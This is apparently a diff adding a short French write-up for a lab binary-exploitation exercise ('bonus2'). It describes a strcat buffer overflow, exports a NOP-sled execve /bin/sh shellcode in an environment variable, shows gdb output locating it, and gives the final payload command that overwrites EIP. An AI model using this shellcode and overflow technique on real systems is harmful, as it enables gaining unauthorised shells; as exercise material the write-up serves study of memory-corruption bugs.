@@ -1,0 +1,18 @@
+On voit que le programme copie les deux premiers arguments de main dans un buffer (les 40 premiers octets et les 32 premiers respectivement), puis va chercher la valeur de la variable globale "LANG".
+En fonction de sa valeur, le programme va concatener un message d'acceuil d'une langue predifinie et le buffer avec strcat. 
+Il y a trois langues disponible, fi, nl ou anglais (par defaut).
+On voit que la taille des messages de fi et nl + celle des entrées maximales des strncpy overflow le buffer.
+
+En exportant une variable d'environnement contenant un shellcode, et en modifiant d'eip par son adresse, on devrait etre capable d'ouvrir un shell.
+
+export SC=$(python -c 'print "\x90" * 80 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+
+En regardant sous gdb, on peut voir l'adresse du shellcode 
+(gdb) x/20s 0xbffffeb5
+0xbffffeb5:	 "nl"
+0xbffffeb8:	 "LINES=79"
+0xbffffec1:	 "SC=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322\260\vSh//shh/bin\211\343\315\200"
+
+On voit que notre variable d'environnement se trouve a l'adresse 0xbffffec1. Nous utiliserons une adresse arbitraire se trouvant dans les nop.
+
+./bonus2  $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xbf\xff\xff\x0d"[::-1]')
